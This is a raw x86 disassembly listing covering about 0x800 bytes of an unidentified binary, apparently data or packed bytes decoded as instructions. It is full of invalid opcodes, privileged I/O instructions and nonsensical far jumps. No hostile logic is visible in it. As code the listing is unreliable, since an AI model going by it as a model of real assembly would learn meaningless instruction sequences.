  419503:	mov    ds:0xda6ae138,eax
  419508:	rcl    BYTE PTR [ecx+0x57b0b5a1],1
  41950e:	xchg   esp,eax
  41950f:	ja     0x419536
  419511:	sbb    esi,DWORD PTR ds:[ecx-0x35c09525]
  419518:	inc    esi
  419519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41951a:	pop    ebx
  41951b:	ja     0x41952d
  41951d:	sbb    DWORD PTR ds:0x60cdd691,0x3f
  419524:	dec    ecx
  419525:	or     ebx,edi
  419527:	inc    ebp
  419528:	and    eax,0xce6927e4
  41952d:	mul    BYTE PTR [ebx+0x73eaa9f5]
  419533:	mov    esi,0xf5dde30c
  419538:	or     eax,0xa70860cc
  41953d:	sahf   
  41953e:	popa   
  41953f:	mov    bl,0x2b
  419541:	enter  0xb737,0x85
  419545:	xor    ebp,DWORD PTR [edx-0x3739d8ef]
  41954b:	or     al,dh
  41954d:	xchg   esi,eax
  41954e:	out    0x55,eax
  419550:	inc    esi
  419551:	jge    0x41958b
  419553:	sub    DWORD PTR [ebp-0x21c8d612],edi
  419559:	xchg   DWORD PTR [esi+eiz*1],edi
  41955c:	dec    edx
  41955d:	jl     0x419507
  41955f:	test   eax,0xd396b7c2
  419564:	imul   edi,DWORD PTR [ecx+0x4a],0xfb2383b9
  41956b:	push   eax
  41956c:	push   ecx
  41956d:	(bad)  
  41956e:	or     ecx,esp
  419570:	fadd   QWORD PTR [esi-0x596c11e6]
  419576:	sub    dl,BYTE PTR [eax]
  419578:	sbb    DWORD PTR [ebx+eiz*2+0x63812dd5],ebx
  41957f:	xchg   dl,bh
  419581:	xor    bh,BYTE PTR [ebp-0x1fa56d41]
  419587:	push   0x79e9197
  41958c:	and    al,0x17
  41958e:	mov    ch,0x2b
  419590:	repz push ecx
  419592:	shl    BYTE PTR [edx-0x43],1
  419595:	add    bl,bl
  419597:	jo     0x41953e
  419599:	das    
  41959a:	data16 xlat BYTE PTR ds:[bx]
  41959d:	cpuid  
  41959f:	imul   ebx,DWORD PTR [ebx*1-0x6279b873],0xffffffae
  4195a7:	adc    BYTE PTR [ecx+0x21],0x28
  4195ab:	jns    0x419571
  4195ad:	test   al,0x3c
  4195af:	xor    ch,BYTE PTR [ebp+0x4f]
  4195b2:	push   eax
  4195b3:	dec    esp
  4195b4:	and    dh,bl
  4195b6:	ins    BYTE PTR es:[edi],dx
  4195b7:	or     al,0x3e
  4195b9:	mov    BYTE PTR [ebx+esi*8-0x39],ch
  4195bd:	mov    ecx,0x8f960f7
  4195c2:	shl    BYTE PTR [edi-0x253d7d6f],1
  4195c8:	stc    
  4195c9:	into   
  4195ca:	adc    al,0x40
  4195cc:	stos   BYTE PTR es:[edi],al
  4195cd:	dec    esi
  4195ce:	pop    esp
  4195cf:	inc    ebp
  4195d0:	ret    
  4195d1:	inc    esp
  4195d2:	popf   
  4195d3:	xchg   ebp,eax
  4195d4:	jno    0x4195e9
  4195d6:	rcr    BYTE PTR [eax-0x2fc9f039],1
  4195dc:	mov    ecx,0xda094a2a
  4195e1:	cdq    
  4195e2:	ins    DWORD PTR es:[edi],dx
  4195e3:	mov    al,ds:0x52e258d9
  4195e8:	sbb    esi,ecx
  4195ea:	push   ecx
  4195eb:	addr16 sbb eax,0x1338bd66
  4195f1:	jae    0x4195e8
  4195f3:	call   0x539ec75c
  4195f8:	(bad)  
  4195fa:	fisubr DWORD PTR ds:0x34c1aa22
  419600:	push   esi
  419601:	cmp    ebx,eax
  419603:	jne    0x41966b
  419605:	fwait
  419606:	sbb    BYTE PTR [edx-0x20],cl
  419609:	mov    eax,0x2834a604
  41960e:	cmp    eax,DWORD PTR [esi]
  419610:	xlat   BYTE PTR ds:[ebx]
  419611:	into   
  419612:	sub    al,0x8c
  419614:	or     al,0x4
  419616:	lods   eax,DWORD PTR ds:[esi]
  419617:	je     0x4195c6
  419619:	inc    edi
  41961a:	dec    esp
  41961b:	fist   DWORD PTR [ebx+eiz*4+0x52]
  41961f:	sub    edi,DWORD PTR [eax]
  419621:	imul   eax,DWORD PTR [ebp-0x2b5e54b8],0xd7d2d867
  41962b:	icebp  
  41962c:	in     al,dx
  41962d:	fucom  st(2)
  41962f:	mov    edi,0x193f87b8
  419634:	adc    edi,DWORD PTR [esi]
  419636:	retf   0xd0ac
  419639:	adc    dl,al
  41963b:	sbb    edi,esp
  41963d:	aad    0x4b
  41963f:	mov    bl,0xd0
  419641:	jae    0x41965f
  419643:	jo     0x4195de
  419645:	push   esi
  419646:	lahf   
  419647:	mov    eax,0x1722fe34
  41964c:	pop    ds
  41964d:	lock jl 0x4196b0
  419650:	pop    ss
  419651:	add    edx,DWORD PTR [eax]
  419653:	fldcw  WORD PTR ds:0x184098f5
  419659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41965a:	pop    ds
  41965b:	stos   BYTE PTR es:[edi],al
  41965c:	pop    esi
  41965d:	mov    WORD PTR [edi],cs
  41965f:	scas   eax,DWORD PTR es:[edi]
  419660:	fs inc esi
  419662:	inc    eax
  419663:	ds ja  0x4195e8
  419666:	ror    BYTE PTR [ebp+0x31a4d0ef],0x8a
  41966d:	inc    edi
  41966e:	cld    
  41966f:	and    esi,DWORD PTR [esi+ebx*2+0x1bc50d9f]
  419676:	shr    DWORD PTR [esi-0x3c638fe5],0x91
  41967d:	xor    esp,esi
  41967f:	jecxz  0x4196d4
  419681:	fnstcw WORD PTR [edi]
  419683:	ins    BYTE PTR es:[edi],dx
  419684:	adc    DWORD PTR [esi],ebx
  419686:	pop    esi
  419687:	out    dx,al
  419688:	dec    edi
  419689:	and    edi,DWORD PTR [ebp-0xe]
  41968c:	xor    BYTE PTR [eax+0x65],ch
  41968f:	daa    
  419690:	push   edx
  419691:	imul   edx,edx,0x28b2142
  419697:	push   es
  419698:	and    eax,DWORD PTR [ecx]
  41969a:	mov    DWORD PTR [edi-0x79],edx
  41969d:	retf   0x25a3
  4196a0:	cmp    bl,BYTE PTR [ebx-0x52a2329c]
  4196a6:	add    ch,dh
  4196a8:	popf   
  4196a9:	retf   0x7cae
  4196ac:	test   esp,edx
  4196ae:	in     al,0xc
  4196b0:	test   eax,0xdb89b892
  4196b5:	test   eax,0x1717076e
  4196ba:	mov    ds:0x6a6b1d49,al
  4196bf:	sbb    esp,DWORD PTR [edi+esi*1+0x38]
  4196c3:	mov    ch,0x6f
  4196c5:	inc    ebx
  4196c6:	int    0x18
  4196c8:	ds mov bh,0xbd
  4196cb:	stc    
  4196cc:	gs push ebp
  4196ce:	sub    DWORD PTR [ecx],esp
  4196d0:	(bad)  
  4196d1:	fiadd  DWORD PTR [ebx+0x65d04ded]
  4196d7:	jns    0x419707
  4196d9:	or     cl,BYTE PTR [ecx-0x2e956fc5]
  4196df:	es push esp
  4196e1:	jno    0x4196f1
  4196e3:	int    0x3c
  4196e5:	pop    ebx
  4196e6:	adc    DWORD PTR [edi+edx*8],edx
  4196e9:	pop    esp
  4196ea:	bnd call 0x494ce3f6
  4196f0:	mov    ch,0xf0
  4196f2:	add    edx,DWORD PTR [eax]
  4196f4:	add    eax,DWORD PTR [edx]
  4196f6:	pop    ecx
  4196f7:	aaa    
  4196f8:	outs   dx,DWORD PTR ds:[esi]
  4196f9:	arpl   WORD PTR [eax+0x5b87cef2],cx
  4196ff:	loope  0x419688
  419701:	pop    ss
  419702:	rcl    BYTE PTR [ebp-0x5cbda4c2],cl
  419708:	mov    al,0x36
  41970a:	add    edx,DWORD PTR [edi+0x33]
  41970d:	mov    ah,0x2d
  41970f:	or     eax,0xb258284f
  419714:	pop    esp
  419715:	cmp    al,0x25
  419718:	out    dx,eax
  419719:	dec    edx
  41971a:	(bad)  
  41971b:	popa   
  41971c:	scas   al,BYTE PTR es:[edi]
  41971d:	cmp    ebp,DWORD PTR ds:0xcdf1d72d
  419723:	dec    esi
  419724:	(bad)
  419727:	imul   ebx,DWORD PTR [ebp-0x2c],0xffffffd2
  41972b:	aam    0x36
  41972d:	sub    edi,DWORD PTR [edx+eax*8+0x41]
  419731:	mov    ch,BYTE PTR [ebp+0x27adc305]
  419737:	mov    bl,dh
  419739:	mov    dh,bl
  41973b:	repz scas al,BYTE PTR es:[edi]
  41973d:	xchg   BYTE PTR [ebx-0xf9b3094],ah
  419743:	into   
  419744:	mov    ds,WORD PTR [edx+ebx*4-0x3a683ad4]
  41974b:	sar    DWORD PTR [eax-0x6f7cdf0e],1
  419751:	std    
  419752:	enter  0x2288,0xaa
  419756:	jae    0x419754
  419758:	jns    0x419723
  41975a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41975b:	and    dh,0x32
  41975e:	int    0x2
  419760:	xlat   BYTE PTR ds:[ebx]
  419761:	jle    0x4197cc
  419763:	jp     0x4197c7
  419765:	xlat   BYTE PTR ds:[ebx]
  419766:	int    0xe3
  419768:	popf   
  419769:	jae    0x419728
  41976b:	iret   
  41976c:	ror    DWORD PTR [ebp-0x2],1
  41976f:	adc    eax,0xd35718b
  419774:	inc    eax
  419775:	sahf   
  419776:	xchg   ebx,eax
  419777:	add    bh,BYTE PTR [ebp-0x65ad2f28]
  41977d:	pop    ecx
  41977e:	aad    0x7c
  419780:	data16 ss in al,0xd8
  419784:	call   0x2e6ea3e3
  419789:	add    BYTE PTR [esi],bl
  41978b:	push   0xd87ae2e3
  419790:	retf   0x71a
  419793:	sbb    bh,dh
  419795:	cmp    DWORD PTR ds:0x14ddee94,edx
  41979b:	cdq    
  41979c:	dec    esp
  41979d:	push   ds
  41979e:	push   esp
  41979f:	dec    bx
  4197a1:	pop    ebp
  4197a2:	test   al,0x81
  4197a4:	xor    al,0x52
  4197a6:	call   0x35fea89a
  4197ab:	sub    BYTE PTR [edi],0x17
  4197ae:	adc    al,0x3a
  4197b0:	dec    eax
  4197b1:	xor    ah,ch
  4197b3:	mov    eax,ds:0x65dd01b4
  4197b8:	mov    ?,WORD PTR [eax+ebp*4+0x7412fa41]
  4197bf:	jg     0x4197d5
  4197c1:	outs   dx,BYTE PTR ds:[esi]
  4197c2:	mov    al,ds:0x5343cf35
  4197c7:	jae    0x4197cb
  4197c9:	xchg   edx,eax
  4197ca:	out    dx,eax
  4197cb:	pop    esp
  4197cc:	pop    ss
  4197cd:	test   BYTE PTR [edx+0x2c],ch
  4197d0:	std    
  4197d1:	aad    0xe8
  4197d3:	jne    0x419806
  4197d5:	or     bh,BYTE PTR [ebp+0x1e521b07]
  4197db:	cdq    
  4197dc:	ja     0x419820
  4197de:	jne    0x419836
  4197e0:	mov    ebx,0x47171a91
  4197e5:	add    BYTE PTR [ebp+0x1a],bh
  4197e8:	jl     0x41981f
  4197ea:	cmp    al,0xc7
  4197ec:	mov    ds:0x902a7571,eax
  4197f1:	loop   0x4197d5
  4197f3:	pop    ds
  4197f4:	dec    eax
  4197f5:	jmp    0x36a0:0x70ea6f63
  4197fc:	add    esp,DWORD PTR [ecx-0x52]
  4197ff:	cmp    DWORD PTR ds:0xa4f94125,esi
  419805:	jbe    0x4197c2
  419807:	mov    eax,ds:0x23313411
  41980c:	in     eax,0x17
  41980e:	xchg   BYTE PTR [esi-0x2c],cl
  419811:	mov    edx,eax
  419813:	stos   BYTE PTR es:[edi],al
  419814:	pcmpeqb mm2,QWORD PTR [edi+0x27]
  419818:	mov    ebp,0x763ebd26
  41981d:	xchg   ebp,eax
  41981e:	adc    BYTE PTR [ecx-0x5e022fdc],bh
  419824:	out    dx,eax
  419825:	loop   0x4197d9
  419827:	shl    BYTE PTR [edi-0x5d27a028],1
  41982d:	or     ebx,esi
  41982f:	gs stos BYTE PTR es:[edi],al
  419831:	mov    DWORD PTR [ebp+0x7d],ecx
  419834:	cld    
  419835:	ficom  WORD PTR [edi]
  419837:	in     al,0xc8
  419839:	adc    al,BYTE PTR [edx+0x7fdb2a7b]
  41983f:	aam    0xa2
  419841:	jb     0x4197fb
  419843:	sbb    DWORD PTR [ecx],ebp
  419845:	push   esi
  419846:	dec    eax
  419847:	mov    edx,0x3ef6fa97
  41984c:	repnz sahf 
  41984e:	outs   dx,DWORD PTR ds:[esi]
  41984f:	sub    al,0xae
  419851:	jae    0x419879
  419853:	imul   ebp,DWORD PTR [esp+ebx*2],0xa7a68583
  41985a:	int    0xcd
  41985c:	mov    ds:0x8c74d627,al
  419861:	push   eax
  419862:	int3   
  419863:	cmp    ebp,DWORD PTR [eax+0x64]
  419866:	mov    esi,esi
  419868:	sar    edi,cl
  41986a:	dec    ebp
  41986b:	mov    bl,0x2a
  41986d:	pushf  
  41986e:	mov    ch,0x84
  419870:	pushf  
  419871:	es or  al,0x3e
  419874:	jecxz  0x4198e5
  419876:	das    
  419877:	adc    ecx,DWORD PTR [edx+0x4aed433c]
  41987d:	mov    BYTE PTR [eax-0x58],0x68
  419881:	repnz hlt 
  419883:	int    0x3e
  419885:	gs and eax,0x6ff13784
  41988b:	dec    eax
  41988c:	sti    
  41988d:	pop    ebx
  41988e:	pop    esp
  41988f:	adc    esp,DWORD PTR [esi-0x6227a65c]
  419895:	xor    ebp,ecx
  419897:	lods   al,BYTE PTR ds:[esi]
  419898:	sbb    DWORD PTR [ecx+0x6d],esi
  41989b:	fnsave [esi-0x22be32d2]
  4198a1:	adc    DWORD PTR [ecx],esp
  4198a3:	cs imul esp,edx,0xe1710d43
  4198aa:	fs enter 0xedec,0xbf
  4198af:	push   eax
  4198b0:	stos   BYTE PTR es:[edi],al
  4198b1:	hlt    
  4198b2:	iret   
  4198b3:	mov    edx,0x21addc79
  4198b8:	mov    WORD PTR [edi],ds
  4198ba:	add    esi,DWORD PTR [ecx-0x47955910]
  4198c0:	sbb    DWORD PTR [ecx+0x3072eb64],0x12a1da37
  4198ca:	jmp    0x4a7f42d5
  4198cf:	cli    
  4198d0:	push   ss
  4198d1:	loope  0x4198c6
  4198d3:	leave  
  4198d4:	pop    ds
  4198d5:	or     edx,DWORD PTR [esi+0x1a]
  4198d8:	mov    ch,0x36
  4198da:	mov    esi,0xd19a569a
  4198df:	inc    esi
  4198e0:	aam    0x46
  4198e2:	push   es
  4198e3:	mul    DWORD PTR [esi-0x2e37c820]
  4198e9:	loop   0x4198ce
  4198eb:	(bad)  [ebx]
  4198ed:	dec    esi
  4198ee:	mov    edx,0xbe953d0f
  4198f3:	arpl   dx,cx
  4198f5:	cs inc esp
  4198f7:	mov    ch,0x63
  4198f9:	ror    DWORD PTR [edx-0x28],cl
  4198fc:	push   esp
  4198fd:	stos   BYTE PTR es:[edi],al
  4198fe:	mov    ds:0x221cb145,al
  419903:	lahf   
  419904:	daa    
  419905:	lock out dx,eax
  419907:	ins    BYTE PTR es:[edi],dx
  419908:	jg     0x419955
  41990a:	sub    esi,edi
  41990c:	xor    al,0x7b
  41990e:	cmp    DWORD PTR [esi],0x8839136f
  419914:	xor    BYTE PTR [edx],dl
  419916:	jl     0x41997c
  419918:	call   0xdeb0:0x6afd61f
  41991f:	push   ss
  419920:	mov    cl,0x6e
  419922:	mov    ebp,0x47afe9ad
  419927:	sbb    al,0x47
  419929:	popf   
  41992a:	subps  xmm0,XMMWORD PTR [ebx]
  41992d:	je     0x419971
  41992f:	adc    eax,0x136e48f5
  419934:	and    DWORD PTR [edx],esp
  419936:	int    0x72
  419938:	sar    DWORD PTR [edx-0x13002ee],1
  41993e:	jg     0x419995
  419940:	add    ah,bl
  419942:	mov    bh,0xa0
  419944:	xchg   edi,eax
  419945:	in     eax,dx
  419946:	fistp  WORD PTR [esi]
  419948:	jne    0x4198cd
  41994a:	add    ebp,esi
  41994c:	mov    al,ds:0x81f0c365
  419951:	in     eax,0xac
  419953:	loope  0x4198dd
  419955:	pop    edx
  419956:	test   bh,al
  419958:	and    ebx,ebx
  41995a:	cmp    al,0xf1
  41995c:	inc    ecx
  41995d:	rol    BYTE PTR [ebx+0xe],1
  419960:	mov    eax,ds:0xb6f31d9b
  419965:	push   es
  419966:	int3   
  419967:	ins    DWORD PTR es:[edi],dx
  419968:	sbb    ebp,ecx
  41996a:	ins    BYTE PTR es:[edi],dx
  41996b:	fldenv [edi-0x2b]
  41996e:	add    bl,BYTE PTR [ecx-0xc]
  419971:	jl     0x4199c5
  419973:	dec    eax
  419974:	ret    0x7817
  419977:	rcl    DWORD PTR [esi+0x3e1fe9bd],1
  41997d:	int3   
  41997e:	or     BYTE PTR [esi+esi*1],dh
  419981:	imul   esi,DWORD PTR [eiz*4+0x5ff07e20],0xffffffb7
  419989:	fcmove st,st(3)
  41998b:	ret    0x30b2
  41998e:	add    DWORD PTR [ebp-0x1b0ba850],esi
  419994:	retf   
  419995:	loope  0x419919
  419997:	xchg   ebx,eax
  419998:	mov    BYTE PTR [eax-0x5fe7330],ch
  41999e:	xor    bh,dl
  4199a0:	dec    edi
  4199a1:	push   eax
  4199a2:	xor    ebx,DWORD PTR [edi-0xd6c00b3]
  4199a8:	loope  0x419976
  4199aa:	mov    cl,BYTE PTR [esi+esi*8+0x52b36743]
  4199b1:	out    0x0,al
  4199b3:	mov    ds:0xe6557fc4,al
  4199b8:	mov    esp,0xea3c01c
  4199bd:	in     al,dx
  4199be:	aaa    
  4199bf:	loopne 0x4199a4
  4199c1:	lods   eax,DWORD PTR ds:[esi]
  4199c2:	mov    ebp,0xa59e053f
  4199c7:	(bad)  
  4199c8:	push   esp
  4199c9:	sbb    DWORD PTR [esi],0xee546a86
  4199cf:	add    ah,bh
  4199d1:	or     eax,DWORD PTR [esi+0x3ba893a]
  4199d7:	ins    BYTE PTR es:[edi],dx
  4199d8:	addr16 or dh,ch
  4199db:	xor    eax,esi
  4199dd:	imul   ebp,DWORD PTR [edi],0xffffff90
  4199e0:	push   edi
  4199e1:	arpl   WORD PTR [ecx],cx
  4199e3:	mov    bl,0xb6
  4199e5:	mov    ah,0x61
  4199e7:	mov    edx,0x8d8f9379
  4199ec:	(bad)  
  4199ed:	loope  0x41998f
  4199ef:	stos   DWORD PTR es:[edi],eax
  4199f0:	fst    DWORD PTR [edx]
  4199f2:	mov    dh,0xfa
  4199f4:	sub    BYTE PTR [esi-0x72a13862],dh
  4199fa:	mov    cs,WORD PTR [ebp-0x68dc841a]
  419a00:	pop    edi
  419a01:	popa   
  419a02:	mov    ebp,0x464cd9fe
  419a07:	lea    ebp,[ebx+0x32810952]
  419a0d:	mov    dh,0x2d
  419a0f:	lahf   
  419a10:	add    edi,ebx
  419a12:	retf   0xc452
  419a15:	or     dh,BYTE PTR [edi]
  419a17:	pushf  
  419a18:	sub    eax,0x1fcfc8a3
  419a1d:	je     0x4199be
  419a1f:	les    ebp,FWORD PTR [ecx+ebx*4-0x51e23b84]
  419a26:	pop    ds
  419a27:	pop    esi
  419a28:	out    0xfc,al
  419a2a:	sub    esp,esp
  419a2c:	inc    ecx
  419a2d:	or     bl,dh
  419a2f:	(bad)  [ebp+0x56]
  419a32:	call   0xbe303b3b
  419a37:	sub    eax,0x961e7137
  419a3c:	and    eax,0xf38732d9
  419a41:	lahf   
  419a42:	mov    eax,ds:0xfdd91a63
  419a47:	or     DWORD PTR [ebp+0x70101320],0x2e5dca35
  419a51:	lahf   
  419a52:	cwde   
  419a53:	push   edx
  419a54:	dec    eax
  419a55:	in     eax,dx
  419a56:	(bad)  
  419a57:	das    
  419a58:	cli    
  419a59:	dec    ecx
  419a5a:	enter  0x6608,0x4c
  419a5e:	stc    
  419a5f:	pop    ds
  419a60:	add    ah,BYTE PTR [eax]
  419a62:	sbb    dl,al
  419a64:	add    eax,0x85488957
  419a69:	sbb    al,0xe9
  419a6b:	mov    ?,ecx
  419a6d:	jge    0x419ac4
  419a6f:	stc    
  419a70:	loop   0x419a3f
  419a72:	xor    DWORD PTR [esi-0x829ef81],0x1d
  419a79:	test   eax,0xd7403459
  419a7e:	aam    0x27
  419a80:	cmp    eax,0x3b301b38
  419a85:	push   eax
  419a86:	cs cwde 
  419a88:	cli    
  419a89:	std    
  419a8a:	out    dx,al
  419a8b:	outs   dx,BYTE PTR ds:[esi]
  419a8c:	sub    cl,BYTE PTR [esi]
  419a8e:	inc    esi
  419a8f:	xlat   BYTE PTR ds:[ebx]
  419a90:	fcom   QWORD PTR [eax+0x2d]
  419a93:	pop    ecx
  419a94:	(bad)  
  419a96:	fstp   DWORD PTR [ecx+0x23]
  419a99:	das    
  419a9a:	test   eax,0x379cb3a3
  419a9f:	fsub   st(0),st
  419aa1:	mov    ss,WORD PTR [ebp-0x5d]
  419aa4:	repnz imul ebp,DWORD PTR [edx-0x19],0x26c09c1a
  419aac:	xchg   DWORD PTR [ecx-0x683c5c05],eax
  419ab2:	int    0xb0
  419ab4:	loop   0x419a41
  419ab6:	dec    ebp
  419ab7:	sub    al,BYTE PTR [eax+0x13]
  419aba:	in     eax,0xd4
  419abc:	clc    
  419abd:	outs   dx,DWORD PTR ds:[esi]
  419abe:	shl    BYTE PTR [esi],1
  419ac0:	push   cs
  419ac1:	push   ecx
  419ac2:	imul   ecx,ecx,0xffffff91
  419ac5:	jo     0x419af8
  419ac7:	push   edx
  419ac8:	add    bl,BYTE PTR [esi-0x7abd533d]
  419ace:	jbe    0x419b32
  419ad0:	push   edi
  419ad1:	push   eax
  419ad2:	gs sub esp,edx
  419ad5:	mov    BYTE PTR [ebp+0x36],al
  419ad8:	add    al,0x23
  419ada:	data16 scas al,BYTE PTR es:[edi]
  419adc:	adc    eax,0x797316
  419ae1:	jnp    0x419b21
  419ae3:	dec    edi
  419ae4:	inc    edx
  419ae5:	repz fs lock sub al,0x8
  419aea:	(bad)  
  419aeb:	cli    
  419aec:	mov    ch,0xa7
  419aee:	sub    BYTE PTR [eax+0x3433d80c],dl
  419af4:	jnp    0x419b6d
  419af6:	jb     0x419ab5
  419af8:	in     eax,dx
  419af9:	ja     0x419b52
  419afb:	fisub  WORD PTR [edi-0x1400887f]
  419b01:	jo     0x419ae1
  419b03:	fst    QWORD PTR [edi-0x75]
  419b06:	jae    0x419ac4
  419b08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b09:	mov    bl,0x6f
  419b0b:	sahf   
  419b0c:	adc    al,bl
  419b0e:	add    DWORD PTR [ecx-0x5e],esi
  419b11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b12:	jne    0x419b6c
  419b14:	mov    dl,0x69
  419b16:	cmp    eax,0xd0175e0c
  419b1b:	gs push esi
  419b1d:	xchg   edx,esp
  419b1f:	in     al,dx
  419b20:	rcl    DWORD PTR ds:0xf874c60e,1
  419b26:	push   esp
  419b27:	cmp    edx,esi
  419b29:	es stos DWORD PTR es:[edi],eax
  419b2b:	jl     0x419b2f
  419b2d:	(bad)  
  419b2e:	xchg   BYTE PTR gs:[eax-0x4e8d6983],ch
  419b35:	sub    DWORD PTR [ecx+0x16],ecx
  419b38:	daa    
  419b39:	into   
  419b3a:	test   DWORD PTR [ebx-0x41],esp
  419b3d:	mov    es,WORD PTR [ebx-0x1fcf5bd1]
  419b43:	outs   dx,BYTE PTR ds:[esi]
  419b44:	aas    
  419b45:	push   edx
  419b46:	mov    fs,WORD PTR [ecx-0x5b]
  419b49:	jb     0x419bc0
  419b4b:	push   es
  419b4c:	or     eax,edx
  419b4e:	(bad)  
  419b4f:	(bad)  
  419b50:	adc    BYTE PTR [ecx+0x7c],ch
  419b53:	pusha  
  419b54:	mov    ebx,0x426a907b
  419b59:	jbe    0x419b1c
  419b5b:	sub    BYTE PTR [edx],ah
  419b5d:	add    eax,DWORD PTR [edx*1-0x6a468240]
  419b64:	aaa    
  419b65:	jmp    0x4434:0x42ea80dd
  419b6c:	test   al,0x6a
  419b6e:	dec    esp
  419b6f:	pop    ebp
  419b70:	cmp    al,BYTE PTR [eax]
  419b72:	into   
  419b73:	(bad)  
  419b75:	adc    cl,BYTE PTR [edx-0x3a]
  419b78:	nop
  419b79:	test   DWORD PTR [edi-0x7ad6df6c],edx
  419b7f:	or     DWORD PTR [ebx+ebp*8],edx
  419b82:	outs   dx,DWORD PTR ds:[esi]
  419b83:	inc    ebp
  419b84:	inc    esp
  419b85:	and    eax,0x30158fc4
  419b8a:	in     eax,0x30
  419b8c:	popf   
  419b8d:	sahf   
  419b8e:	retf   
  419b8f:	pop    eax
  419b90:	fistp  WORD PTR [ecx+ebx*1]
  419b93:	inc    ebx
  419b94:	jg     0x419b3f
  419b96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b97:	std    
  419b98:	sub    DWORD PTR [esi-0x51a612e7],ebx
  419b9e:	cmp    eax,DWORD PTR ds:0x3a44fe8d
  419ba4:	jns    0x419b66
  419ba6:	inc    ebp
  419ba7:	xchg   ecx,eax
  419ba8:	loop   0x419b86
  419baa:	and    ecx,DWORD PTR [edx-0x6705a0ba]
  419bb0:	aaa    
  419bb1:	ret    0xf7a6
  419bb4:	faddp  st(7),st
  419bb6:	jne    0x419b7e
  419bb8:	push   edx
  419bb9:	shr    DWORD PTR [ebx+edi*4+0x35],1
  419bbd:	stos   DWORD PTR es:[edi],eax
  419bbe:	cmp    ch,BYTE PTR [edi]
  419bc0:	jp     0x419be1
  419bc2:	jne    0x419ba9
  419bc4:	and    dl,BYTE PTR [ecx+0x7978fa5a]
  419bca:	jns    0x419b69
  419bcc:	outs   dx,BYTE PTR ds:[esi]
  419bcd:	hlt    
  419bce:	(bad)  
  419bcf:	loop   0x419c4b
  419bd1:	cdq    
  419bd2:	mov    ah,0x65
  419bd4:	call   0x5061:0x1707ea9d
  419bdb:	and    BYTE PTR [eax-0x3c5b3455],dh
  419be1:	out    0x48,eax
  419be3:	ret    0x4e6a
  419be6:	retf   0x5bbe
  419be9:	mov    eax,ds:0xdd2fa308
  419bee:	adc    ch,dh
  419bf0:	loopne 0x419c0e
  419bf2:	jnp    0x419c32
  419bf4:	add    BYTE PTR [ebx-0x24d55417],0xbc
  419bfb:	cmp    ebp,DWORD PTR [edi]
  419bfd:	imul   edi,ecx,0xfc0fd
  419c03:	ror    DWORD PTR [esi],0x2e
  419c06:	cmc    
  419c07:	cmp    al,cl
  419c09:	scas   eax,DWORD PTR es:[edi]
  419c0a:	xor    ebx,DWORD PTR [bx+si+0x4d0c]
  419c0f:	push   edx
  419c10:	jno    0x419c8a
  419c12:	cmp    DWORD PTR [eax-0x5a9ddda8],ecx
  419c18:	jecxz  0x419c6d
  419c1a:	pop    ss
  419c1b:	(bad)  
  419c1c:	cmp    BYTE PTR [ebx],bl
  419c1e:	jbe    0x419c21
  419c20:	mov    bl,0x3e
  419c22:	sub    DWORD PTR [ebx],0x2200e8a9
  419c28:	fmul   DWORD PTR ds:0xd2856952
  419c2e:	push   esp
  419c2f:	xchg   edx,eax
  419c30:	jne    0x419c31
  419c32:	xchg   esp,eax
  419c33:	stos   DWORD PTR es:[edi],eax
  419c34:	aaa    
  419c35:	ins    DWORD PTR es:[edi],dx
  419c36:	dec    eax
  419c37:	jecxz  0x419c3b
  419c39:	vcvtsd2ss xmm7,xmm7,QWORD PTR [eax-0x31]
  419c3e:	jle    0x419bf0
  419c40:	imul   ebx,DWORD PTR [edi],0x6a
  419c43:	jmp    0xec85:0x7f5140a0
  419c4a:	call   0x4dd1:0xac0293f4
  419c51:	dec    esp
  419c52:	dec    eax
  419c53:	cwde   
  419c54:	adc    eax,0xb720824f
  419c59:	aad    0x63
  419c5b:	push   cs
  419c5c:	data16 adc al,0x74
  419c5f:	push   esi
  419c60:	cmp    ecx,DWORD PTR [edi+ecx*1-0x7f]
  419c64:	mov    dh,0x7c
  419c66:	sbb    eax,0x1a
  419c69:	push   ds
  419c6a:	xchg   edi,eax
  419c6b:	enter  0xaefb,0xb
  419c6f:	mov    ch,0xa1
  419c71:	jbe    0x419c7d
  419c73:	mov    al,0x94
  419c75:	stos   DWORD PTR es:[edi],eax
  419c76:	es lahf 
  419c78:	mov    ecx,0x54900fc8
  419c7d:	mov    ?,WORD PTR [esi+eax*1-0x5a]
  419c81:	ss dec esp
  419c83:	pop    ebx
  419c84:	push   esi
  419c85:	and    BYTE PTR [ecx+0x55],cl
  419c88:	mov    ch,bl
  419c8a:	or     DWORD PTR [edx-0x3dd13217],0xfbdb96fa
  419c94:	mov    eax,0xb8811396
  419c99:	xor    DWORD PTR [edx],0xffffffd5
  419c9c:	add    al,0xc2
  419c9e:	stos   DWORD PTR es:[edi],eax
  419c9f:	std    
  419ca0:	sub    eax,DWORD PTR [ecx+ecx*4+0x183b936d]
  419ca7:	inc    eax
  419ca8:	mov    esi,0xca641ca
  419cad:	xor    BYTE PTR [esi+0x29150443],cl
  419cb3:	and    al,BYTE PTR [edi-0x7f671551]
  419cb9:	mov    bh,0xb6
  419cbb:	daa    
  419cbc:	mov    eax,0xdae1868b
  419cc1:	fld    DWORD PTR [eax-0x48d55838]
  419cc7:	or     edi,esi
  419cc9:	xchg   ebx,eax
  419cca:	xchg   edx,eax
  419ccb:	pop    ecx
  419ccc:	and    DWORD PTR [esp+edx*8+0x36],ecx
  419cd0:	ret    0xe5b0
  419cd3:	jle    0x419d43
  419cd5:	mov    ds:0x6ccec0d6,eax
  419cda:	dec    edi
  419cdb:	mov    ds:0x287aefb7,al
  419ce0:	stc    
  419ce1:	mov    esp,0x1a154ffd
  419ce6:	xor    esi,0xc68b012b
  419cec:	dec    edx
  419ced:	js     0x419c6f
  419cef:	push   0x2f
  419cf1:	mov    DWORD PTR [edi+0x39],ecx
  419cf4:	mov    fs,WORD PTR [esi]
  419cf6:	jnp    0x419d36
  419cf8:	mov    al,0x14
  419cfa:	rcl    dh,0x26
  419cfd:	mov    bl,dl
  419cff:	fcmovnb st,st(1)
  419d01:	push   ebp
  419d02:	inc    ecx
  419d03:	lods   eax,DWORD PTR ds:[esi]
  419d04:	adc    eax,ecx
  419d06:	push   eax
  419d07:	and    al,0xea
  419d09:	lods   al,BYTE PTR ds:[esi]
